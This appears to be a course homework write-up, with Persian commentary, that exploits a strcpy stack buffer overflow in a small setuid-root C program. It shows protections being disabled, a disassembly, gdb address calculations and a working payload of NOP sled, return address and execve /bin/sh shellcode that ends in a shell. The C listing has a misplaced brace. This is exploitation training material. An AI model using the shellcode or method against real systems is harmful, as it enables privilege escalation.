#include <string.h>

void functionFunction(char *param, int p2, float p3)
}
	char local[10];

	strcpy(local, param);
}

int main(int argc, char** argv)
{
	functionFunction(argv[1], 42, 3.14);
} 


چون طول شل کد 25 بایت است، معمولا اندازه بافر که سرریز میشه
 اگه بیشتر از این باشه کار سر راست تر است.   وقتی طول بافر 10 و در حافظه هنگام دیباگ 22
  ((gdb) print $ebp-0x12 //12 Hex = 18Decimal )
 شد و شل کد در اون جا نمیشه، شل کد را چند بایت بعد از محل آدرس برگشت گذاشتم. یعنی با 22 تا کاراکتر رسیدم سر خونه آدرس برگشت، آدرس برگشت را گذاشتم 50 بایت اون طرف تر که شل کد است و خود این 50 بایت رو هم با  همون کاراکتر  پر کردم.



cd /Practical2

cd HW3_chall_2

 dir

su root

sudo gcc stackbufferoverflow.c -o stackbufferoverflow -fno-stack-protector -z execstack

sudo chown root:test stackbufferoverflow


sudo chmod 550 stackbufferoverflow

sudo chmod u+s stackbufferoverflow


ls -l stackbufferoverflow


echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space


su test


objdump -d -M intel stackbufferoverflow 

key Out: lea    eax,[ebp-0x12]

 080483eb <functionFunction>:
 80483eb:	55                   	push   ebp
 80483ec:	89 e5                	mov    ebp,esp
 80483ee:	83 ec 18             	sub    esp,0x18
 80483f1:	83 ec 08             	sub    esp,0x8
 80483f4:	ff 75 08             	push   DWORD PTR [ebp+0x8]
 80483f7:	8d 45 ee             	lea    eax,[ebp-0x12]
 80483fa:	50                   	push   eax
 80483fb:	e8 c0 fe ff ff       	call   80482c0 <strcpy@plt>
 8048400:	83 c4 10             	add    esp,0x10
 8048403:	90                   	nop
 8048404:	c9                   	leave  
 8048405:	c3                   	ret    



gdb -q stackbufferoverflow

(gdb) break functionFunction

(gdb)run $(python -c 'print "A"*116')

(gdb) print $ebp
$1 = (void *) 0xbffff328
(gdb) print $ebp-0x12 //12 Hex = 18Decimal
$2 = (void *) 0xbffff316
(gdb) print $ebp+0x8+0x14
$3 = (void *) 0xbffff344


(gdb) run $(python -c 'print "\x90"*22 + "\x44\xf3\xff\xbf"+ "\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" ')

The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /Practical2/HW3_chall_2/stackbufferoverflow $(python -c 'print "\x90"*22 + "\x44\xf3\xff\xbf"+ "\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" ')
process 2667 is executing new program: /bin/dash
$ 


